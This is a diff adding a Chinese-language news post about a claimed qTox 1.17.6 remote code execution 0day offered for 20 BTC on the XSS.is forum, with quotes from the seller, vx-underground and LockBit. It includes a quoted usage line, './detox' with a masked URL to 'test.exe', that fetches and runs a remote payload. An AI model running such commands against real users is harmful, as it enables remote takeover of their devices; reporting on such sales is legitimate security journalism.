@@ -1,0 +1,36 @@
++++
+title = "暗网上流行的聊天软件qTox据称存在远程代码执行漏洞，该漏洞售价20个比特币"
+date = 2023-05-28T10:56:34+08:00
+categories = ["暗网技术", "独家报道"]
+tags = ["0day漏洞", "Tox"]
+thumbnail = ""
++++
+
+<div class="entry-content clearfix">
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><noscript><img fetchpriority="high" decoding="async" width="1024" height="758" src="/images/95ae0c3326b3a4b39d2b87f7fa679c22.webp" alt="暗网上流行的聊天软件qTox据称存在远程代码执行漏洞，该漏洞售价20个比特币" class="wp-image-2607"></noscript><img fetchpriority="high" decoding="async" width="1024" height="758" src="/images/95ae0c3326b3a4b39d2b87f7fa679c22.webp" alt="暗网上流行的聊天软件qTox据称存在远程代码执行漏洞，该漏洞售价20个比特币" class="wp-image-2607 j-lazy"></figure></div>
+<p><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-red-color">“暗网下/AWX”</mark>曾经科普过<span class="wpcom_tag_link">Tox</span>，Tox是一个免费的点对点即时消息传递和视频电话网络协议，可实现加密数据交换。该项目的目标是创建一个安全且易于使用的通信平台。Tox与Tor的结合，可以实现在暗网下完全匿名点对点通信。其中，qTox是使用比较多的客户端。</p>
+<p>近期，在流行的暗网犯罪论坛XSS.is中，高级用户nightly（注册时间为2019年4月10日）宣布以20BTC（52.95万美元）的价格出售暗网上流行的聊天软件qTox最新版本（1.17.6）的漏洞，该漏洞为远程代码执行漏洞。</p>
+<p>为了证明qTox确实存在远程代码执行（RCE）类型的零日漏洞，作者上传并引用了一个包含访问并执行的详细操作信息的GIF图片。该图片向大家展示的是，对于实施攻击而言，用户接受发送给他的通信请求就足够了。</p>
+<p>nightly写道：“一方面，担保人可以由我承担费用，无论谁有定金——我把它扔出去，转让来源并帮助购买后如何使用它。我不会完成任何事情，因为我的脑袋被这些狗屎代码烧得沸腾了。这已经是你的编码器的任务了。”</p>
+<p>根据该贴文，影响以下版本：</p>
+<blockquote class="wp-block-quote">
+<pre class="wp-block-code"><code>You are using qTox version v1.17.6.
+toxcore version: 0.2.13
+Commit hash: 54345d1085628950af4176e6b4873513db0de4f3
+Qt version: 5.7.1</code></pre>
+</blockquote>
+<p>信息安全市场的一些主要参与者几乎立即对此做出了反应。特别是，vx-underground在他们的Telegram频道上写道，该漏洞“将允许攻击地球上几乎所有的勒索软件团伙与威胁行为者。”</p>
+<figure class="wp-block-embed is-type-rich is-provider-twitter wp-block-embed-twitter"><div class="wp-block-embed__wrapper">
+<blockquote class="twitter-tweet" data-width="500" data-dnt="true"><p lang="en" dir="ltr">A TOX 1.17.6 (current version) RCE 0day is for sale.<br><br>It would give nerds the ability to pwn literally every ransomware group, and major Threat Actor, on the planet. All it requests is sending a friend request, and the other person accepting it.<br><br>It is being sold for $500,000</p>— vx-underground (@vxunderground) <a href="https://twitter.com/vxunderground/status/1661789069670780934?ref_src=twsrc%5Etfw">May 25, 2023</a></blockquote><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</div></figure>
+<p>5月25-26日晚上，跟帖中出现漏洞已售出的消息，没有提供买家信息。</p>
+<p>值得注意的是，远程代码执行（RCE）漏洞允许远程代码注入服务器脚本，这在所有可能的情况下都会导致资源或应用程序遭到黑客攻击。因此，攻击者可以快速控制并访问受害者的设备。</p>
+<p>运行示例：</p>
+<blockquote class="wp-block-quote">
+<p>./detox “https://***.zip/test.exe”</p>
+</blockquote>
+<p>与此同时，勒索软件团伙Lockbit宣布终止使用Tox作为与其联系的方式，另外，XSS.is管理员也从他们简介的信息中删除了Tox通信方法的hash。</p>
+<p>Lockbit勒索软件团伙管理人员说：“现在我要如何结交新朋友？不要在 qTox 上给我发消息，我只有老朋友）））”</p>
+<p>XSS.is管理员表示，删除自己的tox的原因是他们的客户存在很多问题，而且没有及时更新，他说：“我对这个漏洞了解不多，但它与qtox有关，不是tox的核心，他说我们正在寻找替代方法或相同的方法。”我们将返回tox，Telegram绝对不是一个替代方案。</p>
+ </div>
